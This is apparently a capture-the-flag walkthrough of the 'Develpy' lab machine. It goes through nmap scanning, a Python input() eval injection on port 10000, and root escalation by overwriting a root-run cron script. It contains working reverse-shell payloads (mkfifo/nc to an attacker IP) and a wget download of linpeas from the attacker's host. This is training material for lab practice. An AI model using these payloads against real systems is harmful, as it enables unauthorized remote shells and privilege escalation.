Develpy

------------------------------
Aaron Aguilar
03-02-2023
------------------------------

first i scan with nmap with this tag 
```
$sudo nmap -T5 -p- 10.10.252.225 -oN nmap_inital.txt | tee nmap.te

sudo nmap -sV -sC p 22,1000 10.10.252.225 -T5 -vvv

and i got this ports open

PORT      STATE SERVICE           REASON         VERSION
22/tcp    open  ssh               syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

10000/tcp open  snet-sensor-mgmt? syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing

```
port 22 and 10000 is open
checking on using netcat ip:10000 it shows that there is a python code injection vulnerability

```
nc 10.10.90.237 10000 

        Private 0days

 Please enther number of exploits to send??: 
 ─$ nc 10.10.90.237 10000

         Private 0days

  Please enther number of exploits to send??: a
 Traceback (most recent call last):
   File "./exploit.py", line 6, in <module>
     num_exploits = int(input(' Please enther number of exploits to send??: '))
   File "<string>", line 1, in <module>
 NameError: name 'a' is not defined

```
I checked for python command injection and found out about the eval() exploit,
on my attack machine I set up the nc listener and run the netcat code in the victim machine

```
victim machine
nc 10.10.90.237 10000

        Private 0days

 Please enther number of exploits to send??: eval('__import__("os").system("mkfifo /tmp/lol;nc 10.18.70.19 4444 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol")')

└─$ rlwrap nc -lnvp 4444            
listening on [any] 4444 ...
connect to [10.18.70.19] from (UNKNOWN) [10.10.90.237] 51004
/bin/sh: 0: can't access tty; job control turned off
$ whoami
king
$ ls
credentials.png
exploit.py
root.sh
run.sh
user.txt
$ ls /home
king
$ cat user.txt
cf85ff769cfaaa721758949bf870b019
$ 
```
before anything else I have to upgrade the shell since this is a dumbshell
```

python -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo;fg
export TERM=xterm
````
# 2. Root txt
Now I just need to escalate my priveleges
```
$ env
LANGUAGE=en_US:
SHLVL=1
SOCAT_PEERADDR=10.18.70.19
HOME=/home/king
SOCAT_PEERPORT=50878
SOCAT_SOCKADDR=10.10.90.237
SOCAT_VERSION=1.7.3.1
SOCAT_SOCKPORT=10000
LOGNAME=king
_=/root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/king
SOCAT_PID=1044
SOCAT_PPID=786

drwxr-xr-x 4 king king   4096 Aug 27  2019 .
drwxr-xr-x 3 root root   4096 Aug 25  2019 ..
-rw------- 1 root root   2929 Aug 27  2019 .bash_history
-rw-r--r-- 1 king king    220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 king king   3771 Aug 25  2019 .bashrc
drwx------ 2 king king   4096 Aug 25  2019 .cache
-rwxrwxrwx 1 king king 272113 Aug 27  2019 credentials.png
-rwxrwxrwx 1 king king    408 Aug 25  2019 exploit.py
drwxrwxr-x 2 king king   4096 Aug 25  2019 .nano
-rw-rw-r-- 1 king king      5 Mar  1 22:20 .pid
-rw-r--r-- 1 king king    655 Aug 25  2019 .profile
-rw-r--r-- 1 root root     32 Aug 25  2019 root.sh
-rw-rw-r-- 1 king king    139 Aug 25  2019 run.sh
-rw-r--r-- 1 king king      0 Aug 25  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 king king     33 Aug 27  2019 user.txt
-rw-r--r-- 1 root root    183 Aug 25  2019 .wget-hsts
```
I dont know what to do so I used linpeas I hosted linpeas in my server to download in the victim machine
```
king@ubuntu:/dev/shm$ wget http://10.18.70.19/linpeas.sh
wget http://10.18.70.19/linpeas.sh
--2023-03-01 22:31:29--  http://10.18.70.19/linpeas.sh
Connecting to 10.18.70.19:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828087 (809K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 808.68K   520KB/s    in 1.6s    

2023-03-01 22:31:31 (520 KB/s) - ‘linpeas.sh’ saved [828087/828087]

king@ubuntu:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
king@ubuntu:/dev/shm$ ./linpeas.sh
./linpeas.sh
```
this seems like a possible escalation vulnerability because it runs everyminute everyday
and is owned by king
```

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   king    cd /home/king/ && bash run.sh
*  *    * * *   root    cd /home/king/ && bash root.sh
*  *    * * *   root    cd /root/company && bash run.sh

````
since the root.sh file is in our home folder, and we do not have read/write access to it, we have to delete it and make a new file named root.sh and enter this code below to intercept the root 
```

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 4445 >/tmp/f




```
````

└─$ nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.18.70.19] from (UNKNOWN) [10.10.18.68] 36496
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls /root
company
root.txt
# cat /root/root.txt
9c37646777a53910a347f387dce025ec
#

```
